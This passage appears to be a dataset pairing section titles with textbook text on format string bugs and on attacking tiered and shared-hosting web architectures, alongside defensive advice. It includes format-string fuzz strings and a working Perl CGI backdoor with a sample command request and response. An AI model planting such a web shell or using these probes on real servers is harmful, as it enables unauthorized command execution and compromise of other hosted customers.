decoded\ncorrectly.\n■ You should monitor the application’s responses for anomalous events, in\nthe same way as described for buffer overflow vulnerabilities.\nFormat String Vulnerabilities\nFormat string vulnerabilities arise when user-controllable input is passed as\nthe format string parameter to a function that takes format specifiers that may\nbe misused, as in the printf family of functions in C. These functions take a\nvariable number of parameters, which may consist of different data types such\nas numbers and strings. The format string passed to the function contains\nspecifiers, which tell it what kind of data is contained in the variable parame-\nters, and in what format it should be rendered.\n70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 532\n532 Chapter 15 ■ Attacking Compiled Applications\nFor example, the following code outputs a message containing the value of\nthe countvariable, rendered as a decimal:\nprintf(“The value of count is %d”, count.);\nThe most dangerous format specifier is %n. This does not actually cause any\ndata to be printed. Rather, it causes the number of bytes output so far to be\nwritten to the address of the pointer passed in as the associated variable para-\nmeter. For example:\nint count = 43;\nint written = 0;\nprintf(“The value of count is %d%n.\\n”, count, &written.);\nprintf(“%d bytes were printed.\\n”, written);\nwhich outputs:\nThe value of count is 43.\n24 bytes were printed.\nIf the format string contains more specifiers than the number of variable\nparameters passed, the function has no way of detecting this, and simply con-\ntinues processing parameters from the call stack.\nIf an attacker controls all or part of the format string passed to a printf-style\nfunction, he can usually exploit this to overwrite critical parts of process mem-\nory and ultimately cause arbitrary code execution. Because the attacker con-\ntrols the format string, he can control both (a) the number of bytes output by\nthe function, and (b) the pointer on the stack that gets overwritten with the\nnumber of bytes output. This enables him to overwrite a saved return address,\nor a pointer to an exception handler, and take control of execution in much the\nsame way as in a stack overflow.\nDetecting Format String Vulnerabilities\nThe most reliable way to detect format string bugs in a remote application is to\nsubmit data containing various format specifiers, and monitor for any anom-\nalies in the application’s behavior. As with uncontrolled triggering of buffer\noverflow vulnerabilities, it is likely that probing for format string flaws will\nresult in a crash within a vulnerable application."
  },
  {
    "input": "Chapter Summary",
    "output": "70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 533\nChapter 15 ■ Attacking Compiled Applications 533\nHACK STEPS\n■ Targeting each parameter in turn, submit strings containing large num-\nbers of the format specifiers %nand %s:\n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\nNote that some format string operations may ignore the %nspecifier for\nsecurity reasons. Supplying the %sspecifier will instead cause the function\nto dereference each parameter on the stack, probably resulting in an access\nviolation if the application is vulnerable.\n■ The Windows FormatMessagefunction uses specifiers in a different way\nfrom the printffamily. To test for vulnerable calls to this function, you\nshould use the following strings:\n%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...\n%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...\n■ Remember to URL-encode the %character as %25.\n■ You should monitor the application’s responses for anomalous events, in\nthe same way as described for buffer overflow vulnerabilities.\nChapter Summary\nSoftware vulnerabilities in native code represent a relatively niche area in rela-\ntion to attacks on web applications. Most applications run in a managed exe-\ncution environment in which the classic software flaws described in this\nchapter do not arise. However, in occasional cases, these kinds of vulnerabili-\nties are highly relevant and have been found to affect many web applications\nrunning on hardware devices and other unmanaged environments. A large\nproportion of such vulnerabilities can be detected by submitting a specific set\nof test cases to the server and monitoring its behavior.\nSome vulnerabilities in compiled applications are relatively easy to exploit,\nsuch as the off-by-one vulnerability describedearlier in this chapter. However,\nin most cases, they are very difficult to exploit given only remote access to the\nvulnerable application.\nIn contrast to most other types of web application vulnerability, even the act\nof probing for classic software flaws is highly likely to cause a denial-of-\ns ervice condition if the application is vulnerable. Before performing any such\ntesting, you should ensure that the application owner accepts the inherent\nrisks involved."
  },
  {
    "input": "Questions",
    "output": "70779c15.qxd:WileyRed 9/14/07 3:14 PM Page 534\n534 Chapter 15 ■ Attacking Compiled Applications\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. Unless any special defenses are in place, why are stack-based buffer\noverflows generally easier to exploit than heap-based overflows?\n2. In the C and C++ languages, how is the length of a string determined?\n3. Why would a buffer overflow vulnerability in an off-the-shelf network\ndevice normally have a much higher likelihood of exploitation than an\noverflow in a proprietary web application running on the Internet?\n4. Why would the following fuzz string fail to identify many instances of\nformat string vulnerabilities?\n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n...\n5. You are probing for buffer overflow vulnerabilities in a web application\nthat makes extensive use of native code components. You find a request\nthat may contain a vulnerability in one of its parameters; however, the\nanomalous behavior you have observed is difficult to reproduce reli-\nably. Sometimes, submitting a long value causes an immediate crash;\nsometimes, you need to submit it several times in succession to cause a\ncrash; sometimes, a crash occurs some time later following a large num-\nber of benign requests.\nWhat is the most likely cause of the application’s behavior?"
  },
  {
    "input": "Tiered Architectures",
    "output": "70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 535\nCHAPTER\n16\nAttacking Application\nArchitecture\nWeb application architecture is an important area of security that is frequently\noverlooked when appraising the security of individual applications. In com-\nmonly used tiered architectures, a failure to segregate different tiers often\nmeans that a single defect in one tier can be exploited to fully compromise\nother tiers and thereby the entire application.\nA different range of security threats arises in environments where multiple\napplications are hosted on the same infrastructure, or even share common com-\nponents of a wider overarching application. In these situations, defects or mali-\ncious code within one application can sometimes be exploited to compromise\nthe entire environment and other applications belonging to different customers.\nIn this chapter, we will examine a range of different architectural configura-\ntions, and describe how you can exploit defects within application architec-\ntures to advance your attack.\nTiered Architectures\nMany web applications use a multi-tiered architecture, in which the applica-\ntion’s user interface, business logic, and data storage are divided between\nmultiple layers, which may use different technologies and be implemented on\n535\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 536\n536 Chapter 16 ■ Attacking Application Architecture\ndifferent physical computers. A common three-tier architecture involves the\nfollowing layers:\n■■ Presentation layer, which implements the application’s interface.\n■■ Application layer, which implements the core application logic.\n■■ Data layer, which provides storage and processing of application data.\nIn practice, many complex enterprise applications employ a more fine-\ngrained division between tiers. For example, a Java-based application may use\nthe following layers and technologies:\n■■ Application server layer (for example, Tomcat).\n■■ Presentation layer (for example, WebWork).\n■■ Authorization and authentication layer (for example, JAAS or ACEGI).\n■■ Core application framework (for example, Struts or Spring).\n■■ Business logic layer (for example, Enterprise Java Beans).\n■■ Database object relational mapping (for example, Hibernate).\n■■ Database JDBC calls.\n■■ Database server.\nA multi-tiered architecture has several advantages over a single-tiered design.\nAs with most types of software, breaking down highly complex processing tasks\ninto simple and modular functional components can provide huge benefits in\nterms of managing the application’s development and reducing the incidence of\nbugs. Individual components with well-defined interfaces can be easily reused\nboth within and between different applications. Different developers can work\nin parallel on components without requiring a deep understanding of the imple-\nmentation details of other components. If it is necessary to replace the technol-\nogy used for one of the layers, this can achieved with minimal impact on the\nother layers. Furthermore, if well-implemented, a multi-tiered architecture can\nhelp to enhance the security posture of the whole application.\nAttacking Tiered Architectures\nA consequence of the previous point is that if defects exist within the imple-\nmentation of a multi-tiered architecture, then these may introduce security\nvulnerabilities. Understanding the multi-tiered model can assist you in attack-\ning a web application, by helping you to identify where different security\ndefenses (such as access controls and input validation) are implemented and\nhow these may break down across tier boundaries. There are three broad cate-\ngories of attack that a poorly designed tiered architecture may make possible:\n■■ You may be able to exploit trust relationships between different tiers to\nadvance an attack from one tier to another.\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 537\nChapter 16 ■ Attacking Application Architecture 537\n■■ If different tiers are inadequately segregated, you may be able to lever-\nage a defect within one tier to directly undercut the security protections\nimplemented at another tier.\n■■ Having achieved a limited compromise of one tier, you may be able to\ndirectly attack the infrastructure supporting other tiers, and so extend\nyour compromise to those tiers.\nWe will examine each of these attacks in more detail.\nExploiting Trust Relationships between Tiers\nDifferent tiers of an application may trust each other to behave in particular\nways. When the application is functioning as normal, these assumptions may\nbe valid. However in anomalous conditions or when under active attack, they\nmay break down. In this situation, you may be able to exploit these trust rela-\ntionships to advance an attack from one tier to another, increasing the signifi-\ncance of the security breach.\nOne very common trust relationship, which exists in many enterprise appli-\ncations, is that the application tier has sole responsibility for managing user\naccess. This tier handles authentication and session management, and imple-\nments all logic that determines whether a particular request should be granted.\nIf the application tier decides to grant a request, it issues the relevant com-\nmands to other tiers in order to carry out the requested actions. Those other\ntiers trust the application tier to carry out access control checks properly, and\nthey therefore honor all commands that they receive from the application tier.\nThis type of trust relationship effectively exacerbates many of the common\nweb vulnerabilities that we have examined in earlier chapters. When a SQL\ninjection flaw exists, this can often be exploited to access all data owned by the\napplication. Even if the application does not access the database as DBA, it\ntypically uses a single account that can read and update all of the application’s\ndata. The database tier effectively trusts the application tier to properly control\naccess to its data.\nIn a similar way, application components often run using powerful operat-\ning system accounts that have permissions to carry out sensitive actions and\naccess key files. In this configuration, the operating system layer effectively\ntrusts the relevant application tiers to not perform undesirable actions. If an\nattacker finds a command injection flaw, they can often fully compromise the\nunderlying operating system supporting the compromised application tier.\nTrust relationships between tiers can also lead to other problems. If program-\nming errors exist within one application tier, these may lead to anomalous\nbehavior in other tiers. For example, the race condition described in Chapter 11\nresults in the back-end database serving up the account information belonging\nto the wrong user. Further, when administrators are investigating an unexpected\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 538\n538 Chapter 16 ■ Attacking Application Architecture\nevent or a security breach, audit logs within trusting tiers will normally be insuf-\nficient to fully understand what has occurred, because they will simply identify\nthe trusted tier as the agent of the event. For example, following a SQL injection\nattack, database logs may record every query injected by the attacker, but to\ndetermine the user responsible it will be necessary to cross-reference these\nevents with entries in the logs of the application tier, which may or may not be\nadequate to identify the perpetrator.\nSubverting Other Tiers\nIf different tiers of the application are inadequately segregated, then an\nattacker who compromises one tier may be able to directly undercut the secu-\nrity protections implemented at another tier, to perform actions or access data\nthat that tier is responsible for controlling.\nThis kind of vulnerability often arises in situations where several different\ntiers are implemented on the same physical computer. This architectural con-\nfiguration is common practice in situations where cost is a key factor. For\nexample, many small applications use a LAMP server (a single computer run-\nning the open source software Linux, Apache, MySQL, and PHP). In this archi-\ntecture, a file disclosure vulnerability within the web application tier, which on\nits own may not represent a critical defect, can result in unrestricted access to\nall application data, because MySQL data is stored in human-readable files\nthat the web application process is often authorized to read. Even if the data-\nbase implements strict access control over its data, and the application uses a\nrange of different low-privileged accounts to connect to the database, these\nprotections may be entirely undercut if an attacker can gain direct access to the\ndata held within the database tier.\nFor example, the application shown in Figure16-1 allows users to choose a\nskin to customize their experience. This involves selecting a cascading style\nsheet (CSS) file, which the application presents to the user for review.\nFigure16-1: An application containing a function to view a selected file\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 539\nChapter 16 ■ Attacking Application Architecture 539\nIf this function contains a path traversal vulnerability (see Chapter 10), then\nan attacker can exploit this to gain direct access to arbitrary data held within\nthe MySQL database, thereby undercutting the controls implemented within\nthe database tier. Figure 16-2 shows a successful attack retrieving the user-\nnames and password hashes from the MySQL user table.\nFigure16-2: An attack which undercuts the database tier to retrieve arbitrary data\nAttacking Other Tiers\nAn attacker who has compromised one tier of the application may often be\nable to launch an infrastructure-layer attack against other tiers of the applica-\ntion. For example, having gained the ability to execute arbitrary commands on\none server, an attacker can initiate network connections to search the network\nfor other hosts, scan for running services, and probe for exploitable vulnera-\nbilities within those services.\nAn attacker who compromises the operating system on a host can effec-\ntively compromise any application running on that host. Hence, a successful\ninfrastructure-layer attack against any tier of the application is likely to result\nin a full compromise of that tier.\nOf course, as described in Chapter 1, an attacker may also leverage a vulner-\nable web application as a gateway into an organization’s wider internal infra-\nstructure, beyond those hosts that support the application itself. Depending on\nthe location of different application components (whether in a DMZ or else-\nwhere on an internal corporate network), an attacker who compromises one\ntier of the application may be able to move to other tiers and beyond these onto\nother sensitive systems and user workstations. A common means of escalating\nan attack is to compromise a dual-homed host with interfaces on networks\nwhich have different trust levels. For example, a separate administrative LAN\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 540\n540 Chapter 16 ■ Attacking Application Architecture\nmay be used for performing critical maintenance on production servers. Even if\nthis LAN is completely segregated from other networks, an attacker who com-\npromises a single host with an interface on the LAN will be able to use it to tar-\nget other servers on the protected network.\nHACK STEPS\n■ As described throughout this book, for any vulnerability you identify\nwithin the application, think imaginatively about how this can exploited\nto achieve your objectives. Countless successful hacks against web appli-\ncations begin from a vulnerability that is intrinsically limited in its\nimpact. By exploiting trust relationships and undercutting controls imple-\nmented elsewhere within the application, it may be possible to leverage\na seemingly minor defect to carry out a serious breach.\n■ If you succeed in performing arbitrary command execution on any com-\nponent of the application, and are able to initiate network connections to\nother hosts, consider ways of directly attacking other elements of the\napplication’s infrastructure at the network and operating system layers,\nin order to expand the scope of your compromise.\nSecuring Tiered Architectures\nIf carefully implemented, a multi-tiered architecture can considerably enhance\nan application’s security, because it localizes the impact of a successful attack.\nIn the basic LAMP configuration described previously, in which all compo-\nnents run on a single computer, the compromising of any tier is likely to lead\nto complete compromise of the application. In a more secure architecture, the\ncompromising of one tier may result in partial control over an application’s\ndata and processing, but it may be more limited in its impact and perhaps con-\ntained to the affected tier.\nMinimize Trust Relationships\nAs far as possible, each tier should implement its own controls to defend against\nunauthorized actions, and should not trust other application components to pre-\nvent security breaches that the tier itself can help to block. Here are some exam-\nples of this principle being applied to different tiers of the application:\n■■ The application server tier can enforce role-based access control over\nspecific resources and URL paths. For example, the application server\ncan verify that any request for the /adminpath was received from an\nadministrative user. Controls can also be imposed over different kinds\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 541\nChapter 16 ■ Attacking Application Architecture 541\nof resources, such as specific types of scripts and static resources. This\nmitigates the impact of certain kinds of access control defects within the\nweb application tier, because users who are not authorized to access\ncertain functionality will have their request blocked before it reaches\nthat tier.\n■■ The database server tier can provide various accounts for use by the\napplication for different users and different actions. For example,\nactions on behalf of unauthenticated users can be carried out with a\nlow-privileged account allowing read-only access to a restricted set of\ndata. Different categories of authenticated users can be assigned differ-\nent database accounts, granting read and write access to different sub-\nsets of the application’s data, in line with the user’s role. This mitigates\nthe impact of many SQL injection vulnerabilities, because a successful\nattack may result in no further access than the user could legitimately\nobtain by using the application as intended.\n■■ All application components can run using operating system accounts\nthat possess the least level of privileges required for normal operation.\nThis mitigates the impact of any command injection or file access flaws\nwithin these components. In a well-designed and fully hardened archi-\ntecture, vulnerabilities of this kind may provide an attacker with no\nuseful opportunities to access sensitive data or perform unauthorized\nactions.\nSegregate Different Components\nAs far as possible, each tier should be segregated from interacting with other\ntiers in unintended ways. To implement this objective effectively may in some\ncases require different components to be running on different physical hosts.\nHere are some examples of this principle being applied:\n■■ Different tiers should not have read or write access to files used by\nother tiers. For example, the application tier should not have any access\nto the physical files used to store database data, and should only be able\nto access this data in the intended manner using database queries with\nan appropriate user account.\n■■ Network-level access between different infrastructure components\nshould be filtered to permit only those services with which different\napplication tiers are intended to intercommunicate. For example, the\nserver hosting the main application logic may be permitted to commu-\nnicate with the database server only via the port used to issue SQL\nqueries. This precaution will not prevent attacks that actually use this"
  },
  {
    "input": "Shared Hosting and Application Service Providers",
    "output": "70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 542\n542 Chapter 16 ■ Attacking Application Architecture\nservice to target the database tier, but it will prevent infrastructure-level\nattacks against the database server, and will contain any operating sys-\ntem-level compromise from reaching the organization’s wider\nnetwork.\nApply Defense in Depth\nDepending on the exact technologies in use, a variety of other protections can\nbe implemented within different components of the architecture to support\nthe objective of localizing the impact of a successful attack. Here are some\nexamples of these controls:\n■■ All layers of the technology stack on every host should be security\nhardened, in terms of both configuration and vulnerability patching. If\na server’s operating system is insecure, then an attacker exploiting a\ncommand injection flaw with a low-privileged account may be able to\nescalate privileges to fully compromise the server. The attack may then\npropagate through the network if other hosts have not been hardened.\nOn the other hand, if the underlying servers are secured, an attack may\nbe fully contained within one or more tiers of the application.\n■■ Sensitive data persisted in any tier of the application should be\nencrypted to prevent trivial disclosure in the event that that tier is com-\npromised. User credentials and other sensitive information, such as\ncredit card numbers, should be stored in encrypted form within the\ndatabase. Where available, built-in protection mechanisms should be\nused to protect database credentials held on the web application tier.\nFor example, in ASP.NET 2.0, an encrypted database connection string\ncan be stored in the web.configfile.\nShared Hosting and Application Service Providers\nMany organizations use external providers to help deliver their web applica-\ntions to the public. These arrangements range from simple hosting services in\nwhich an organization is given access to a web and/or database server,\nthrough to fully-fledged application service providers (ASPs) who actively\nmaintain the application on behalf of the organization. Arrangements of this\nkind are ideal for small businesses that do not have the skill or resources to\ndeploy their own application, but they are also used by some high-profile\ncompanies to deploy specific applications.\nMost providers of web and application hosting services have many cus-\ntomers and typically support multiple customers’ applications using the same\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 543\nChapter 16 ■ Attacking Application Architecture 543\ninfrastructure, or closely connected infrastructures. An organization that\nchooses to use one of these services must, therefore, consider the following\nrelated threats:\n■■ A malicious customer of the service provider may attempt to interfere\nwith the organization’s application and its data.\n■■ An unwitting customer may deploy a vulnerable application that\nenables malicious users to compromise the shared infrastructure and\nthereby attack the organization’s application and its data.\nWeb sites hosted on shared systems are prime targets for script kiddiesseek-\ning to deface as many web sites as possible, because compromising a single\nshared host can often enable them to attack hundreds of apparently\nautonomous web sites in a short period of time.\nVirtual Hosting\nIn simple shared hosting arrangements, a web server may simply be config-\nured to support multiple virtual web sites with different domain names. This\nis achieved via the Host header, which is mandatory in HTTP version 1.1.\nWhen a browser issues an HTTP request, it includes a Hostheader containing\nthe domain name contained in the relevant URL, and sends the request to the\nIP address associated with that domain name. If multiple domain names\nresolve to the same IP address, the server at this address can still determine\nwhich web site the request is for. For example, Apache can be configured to\nsupport multiple web sites using the following configuration, which sets a dif-\nferent web root directory for each virtually hosted site:\n<VirtualHost *>\nServerName wahh-app1.com\nDocumentRoot /www/app1\n</VirtualHost>\n<VirtualHost *>\nServerName wahh-app2.com\nDocumentRoot /www/app2\n</VirtualHost>\nShared Application Services\nMany ASPs provide ready-made applications that can be adapted and cus-\ntomized for use by their customers. This model is highly cost-effective in indus-\ntries where large numbers of businesses need to deploy highly functional and\ncomplex applications that provide essentially the same functionality to their\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 544\n544 Chapter 16 ■ Attacking Application Architecture\nend users. By using the services of an ASP, businesses can quickly acquire a\nsuitably branded application without incurring the large setup and mainte-\nnance costs that this would otherwise involve.\nThe market for ASP applications is particularly mature in the financial ser-\nvices industry. To take one example, in a given country there may be thou-\nsands of small retailers who wish to offer in-store payment cards and credit\nfacilities to their customers. These retailers outsource this function to dozens\nof different credit card providers, many of whom are themselves start-ups\nrather than long-established banks. These credit card providers offer a com-\nmoditized service in which cost is the main discriminator. Accordingly, many\nof them use an ASP to deliver the web application that is provided to end\nusers. Within each ASP, the same application is therefore customized for a\nhuge number of different retailers.\nFigure16-3 illustrates the typical organization and division of responsibili-\nties in this kind of arrangement. As can be seen from the numerous different\nagents and tasks involved, this setup involves the same kind of security prob-\nlems as in the basic shared hosting model; however, the issues involved may\nwell be more complex. Further, there are additional problems that are specific\nto this arrangement, as described in the next section.\nHost and maintain infrastructure,\ndevelop core application, provide\nApplication Service updates and support\nProvider (ASP)\nCustomize core\nfunctionality according to\ntheir business offering\nCredit card companies\nCustomize application\nskin and non-functional\ncontent\nHigh street retailers\nUse applications to\naccess statements\n& make payments\nEnd users\nFigure16-3: The organization of a typical application service provider\nAttacking Shared Environments\nShared hosting and ASP environments introduce a range of new potential vul-\nnerabilities by which an attacker can target one or more applications within\nthe shared infrastructure.\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 545\nChapter 16 ■ Attacking Application Architecture 545\nAttacks against Access Mechanisms\nBecause various external organizations have a legitimate need to update and\ncustomize the different applications in a shared environment, the provider\nneeds to implement mechanisms by which this remote access can be achieved.\nIn the simplest case of a virtually hosted web site, this may merely involve an\nupload facility such as FTP or SCP, via which customers can write files within\ntheir own web root.\nIf the hosting arrangement includes provision of a database, customers may\nneed to obtain direct access in order to configure their own database setup and\nretrieve data that has been stored by the application. In this situation,\nproviders may implement a web interface to certain database administrative\nfunctions, or may even expose the actual database service on the Internet,\nallowing customers to connect directly and use their own tools.\nIn full-blown ASP environments, where different types of customers need to\nperform different levels of customization on elements of the shared applica-\ntion, providers often implement highly functional applications that customers\ncan use for these tasks. These are often accessed via a virtual private network\n(VPN) or a dedicated private connection into the ASP’s infrastructure.\nGiven the range of remote access mechanisms that may exist, a number of\ndifferent attacks may be possible against a shared environment:\n■■ The remote access mechanism itself may be insecure. For example, the\nFTP protocol is unencrypted, enabling a suitably positioned attacker (for\nexample, within a customer’s own ISP) to capture login credentials.\nAccess mechanisms may also contain unpatched software vulnerabilities\nor configuration defects that enable an anonymous attacker to compro-\nmise the mechanism and interfere with customers’ applications and data.\n■■ The access granted by the remote access mechanism may be overly lib-\neral or poorly segregated between customers. For example, customers\nmay be given a command shell when they require only file access. Alter-\nnatively, customers may not be restricted to their own directories and\nmay be able to update other customers’ content or access sensitive files\non the server operating system.\n■■ The same considerations apply to databases as for file system access.\nThe database may not be properly segregated, with different instances\nfor each customer. Direct database connections may use unencrypted\nchannels such as standard ODBC.\n■■ When a bespoke application is deployed for the purpose of remote\naccess (for example by an ASP), this application must take on the\nresponsibility for controlling different customers’ access to the shared\napplication. Any vulnerabilities within the administrative application\nmay allow a malicious customer or even an anonymous user to inter-\nfere with the applications of other customers. They may also allow\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 546\n546 Chapter 16 ■ Attacking Application Architecture\ncustomers with the limited capability to update their application’s skin\nto escalate privileges and modify elements of the core functionality\ninvolved in their application, to their advantage. Where this kind of\nadministrative application is deployed, any kind of vulnerability within\nthis application may provide a vehicle to attack the shared application\naccessed by end users.\nAttacks between Applications\nIn a shared hosting environment, different customers typically have a legiti-\nmate need to upload and execute arbitrary scripts on the server. This immedi-\nately raises problems that do not exist in single-hosted applications.\nDeliberate Backdoors\nIn the most obvious kind of attack, a malicious customer may upload content\nthat attacks the server itself or other customers’ applications. For example,\nconsider the following Perl script, which implements a remote command facil-\nity on the server:\n#!/usr/bin/perl\nuse strict;\nuse CGI qw(:standard escapeHTML);\nprint header, start_html(“”);\nif (param()){my $command = param(“cmd”);\n$command=`$command`;\nprint “$command\\n”;}\nelse {print start_form(); textfield(“command”);}\nprint end_html;\nAccessing this script over the Internet enables the customer to execute arbi-\ntrary operating system commands on the server:\nGET /scripts/backdoor.pl?cmd=whoami HTTP/1.1\nHost: wahh-maliciousapp.com\nHTTP/1.1 200 OK\nDate: Sun, 03 Dec 2006 19:16:38 GMT\nServer: Apache/2.0.59\nConnection: close\nContent-Type: text/html; charset=ISO-8859-1\n<!DOCTYPE html\nPUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN”\n“http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”>\n<html xmlns=”http://www.w3.org/1999/xhtml” lang=”en-US” xml:lang=”en-\nUS”>\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 547\nChapter 16 ■ Attacking Application Architecture 547\n<head>\n<title>Untitled Document</title>\n<meta http-equiv=”Content-Type” content=”text/html; charset=iso-8859-1”\n/>\n</head>\n<body>\napache\n</body>\n</html>\nBecause the malicious customer’s commands are executing as the Apache\nuser, it is likely that this will allow access to the scripts and data belonging to\nother customers of the shared hosting service.\nThis kind of threat also exists in the context of an ASP-managed shared appli-\ncation. Although the core application functionality is owned and updated by\nthe ASP, individual customers can typically modify this functionality in certain\ndefined ways. A malicious customer may introduce subtle backdoors into code\nthat they control, enabling them to compromise the shared application and gain\naccess to other customers’ data.\nTIP Backdoor scripts can be created in most web scripting languages. For more\nexamples of scripts in other languages, see: http://net-square.com/\npapers/one_way/one_way.html#4.0\nAttacks between Vulnerable Applications\nEven if all customers in a shared environment are benign, and only upload legit-\nimate scripts that are validated by the environment’s owner, attacks between\napplications will of course be possible if vulnerabilities unwittingly exist within\nthe applications of individual customers. In this situation, one vulnerability\nwithin a single application may enable a malicious user to compromise both that\napplication and all others hosted within the shared environment. Many types of\ncommon vulnerability fall into this category. For example:\n■■ A SQL injection flaw in one application may enable an attacker to per-\nform arbitrary SQL queries on the shared database. If there is inadequate\nsegregation of database access between different customers, an attacker\nmay be able to read and modify the data used by all applications.\n■■ A path traversal vulnerability in one application may enable an attacker\nto read or write arbitrary files anywhere on the server file system,\nincluding those belonging to other applications.\n■■ A command injection flaw in one application may enable an attacker to\ncompromise the server and, therefore, the other applications hosted on\nit, in the same way as described for a malicious customer.\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 548\n548 Chapter 16 ■ Attacking Application Architecture\nAttacks between ASP Application Components\nThe possible attacks described previously may all arise in the context of a\nshared ASP application. Because customers can typically perform their own\ncustomizations to core application functionality, a vulnerability introduced by\none customer may enable users of a customized application to attack the main\nshared application, thereby compromising the data of all the ASP’s customers.\nIn addition to these attacks, the ASP scenario introduces further possibilities\nfor malicious customers or users to compromise the wider shared application,\nbecause of the way that different components of the shared application must\ninteroperate. For example:\n■■ Data generated by different applications is often collated in a common\nlocation and viewed by ASP-level users with powerful privileges\nwithin the shared application. This means that an XSS-type attack\nwithin a customized application may result in compromise of the\nshared application. For example, if an attacker can inject JavaScript\ncode into log file entries, payment records, or personal contact informa-\ntion, this may enable them to hijack the session of an ASP-level user,\nand so gain access to sensitive administrative functionality.\n■■ ASPs often employ a shared database to hold data belonging to all cus-\ntomers. Strict segregation of data access may or may not be enforced at\nthe application and database layers. However, in either case there will\ntypically exist some shared components, such as database stored proce-\ndures, that are responsible for processing data belonging to multiple\ncustomers. Defective trust relationships or vulnerabilities within these\ncomponents may allow malicious customers or users to gain access to\ndata in other applications. For example, a SQL injection vulnerability in\na shared stored procedure that runs with definer privileges may result\nin the compromising of the entire shared database.\nHACK STEPS\n■ Examine the access mechanisms provided for customers of the shared\nenvironment to update and manage their content and functionality. Con-\nsider questions like the following:\n■ Does the remote access facility use a secure protocol and suitably\nhardened infrastructure?\n■ Are customers able to access files, data, and other resources that they\ndo not legitimately need to access?\n■ Are customers able to gain an interactive shell within the hosting envi-\nronment and perform arbitrary commands?\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 549\nChapter 16 ■ Attacking Application Architecture 549\nHACK STEPS (continued)\n■ If a proprietary application is used to allow customers to configure and\ncustomize a shared environment, consider targeting this application as a\nmeans of compromising the environment itself and individual applica-\ntions running within it.\n■ If you are able to achieve command execution, SQL injection, or arbitrary\nfile access within one application, investigate carefully whether this pro-\nvides any means of escalating your attack to target other applications.\n■ If you are attacking an ASP-hosted application that comprises a mix of\nshared and customized components, identify any shared components\nsuch as logging mechanisms, administrative functions, and database\ncode components, and attempt to leverage these to compromise the\nshared portion of the application and thereby attack other individual\napplications.\n■ If a common database is used within any kind of shared environment,\nperform a comprehensive audit of the database configuration, patch\nlevel, table structure, and permissions, perhaps using a database scan-\nning tool like NGSSquirrel. Any defects within the database security\nmodel may provide a means of escalating an attack from within one\napplication to another.\nSecuring Shared Environments\nShared environments introduce new types of threats to an application’s secu-\nrity, posed by a malicious customer of the same facility and by an unwitting\ncustomer who introduces vulnerabilities into the environment. To address this\ntwofold danger, shared environments must be carefully designed in terms of\ncustomer access, segregation, and trust, and must implement controls that are\nnot directly applicable to the context of a single-hosted application.\nSecure Customer Access\nWhatever mechanism is provided for customers to maintain the content under\ntheir control, this should protect against unauthorized access by third parties\nand by malicious customers:\n■■ The remote access mechanism should implement robust authentication,\nuse cryptographic technologies that are not vulnerable to eavesdrop-\nping, and be fully security hardened.\n■■ Individual customers should be granted access on a least-privilege\nbasis. For example, if a customer is uploading scripts to a virtually\nhosted server, he should only have read and write permissions to his\n70779c16.qxd:WileyRed 9/14/07 3:15 PM Page 550\n550 Chapter 16 ■ Attacking Application Architecture\nown document root. If a shared database is being accessed, this should\nbe done using a low-privileged account that cannot access data or other\ncomponents belonging to other customers.\n■■ If a bespoke application is used to provide customer access, this should\nbe subjected to rigorous security requirements and testing in line with\nits critical role in protecting the security of the shared environment.\nSegregate Customer Functionality\nCustomers of a shared environment cannot be trusted to create only benign\nfunctionality that is free of vulnerabilities. A robust solution should, therefore,\nuse the architectural controls described in the first half of this chapter to pro-\ntect the shared environment and its customers from attack via rogue content.\nThis involves segregating the capabilities allowed to each customer’s code as\nfollows, to ensure that any deliberate or unwitting compromise is localized in\nits impact and cannot affect other customers:\n■■ Each customer’s application should use a separate operating system\naccount to access the file system, which has read and write access only\nto that application’s file paths.\n■■ The ability to access powerful system functions and commands should\nbe restricted at the operating system level on a least-privilege basis.\n■■ The same protection should be implemented within any shared data-\nbases. A separate database instance should be used for each customer,\nand low-privileged accounts should be assigned to customers, with\naccess to only their own data.\nNOTE Many shared hosting environments based on the LAMP model rely\nupon PHP’s safe mode to limit the potential impact of a malicious or vulnerable\nscript. This mode prevents PHP scripts from accessing certain powerful PHP\nfunctions and places restrictions on the operation of other functions (see\nChapter 18). However, these restrictions are not fully effective and have been\nvulnerable to bypasses. While safe mode may provide a useful layer of defense,\nit is architecturally the wrong place to control the impact of a malicious or\nvulnerable application, because it involves the operating system trusting the\napplication tier to control its actions. For this reason and others, safe mode has\nbeen removed from PHP version 6.\nTIP If you are able to execute arbitrary PHP commands on a server, use the\nphpinfo()command to return details of the PHP environment’s configuration.\nYou can review this information to establish whether safe mode is enabled, and\nhow other configuration options may affect what actions you can easily\nperform. See Chapter 18 for further details."
  },
  {
    "input": "Questions",
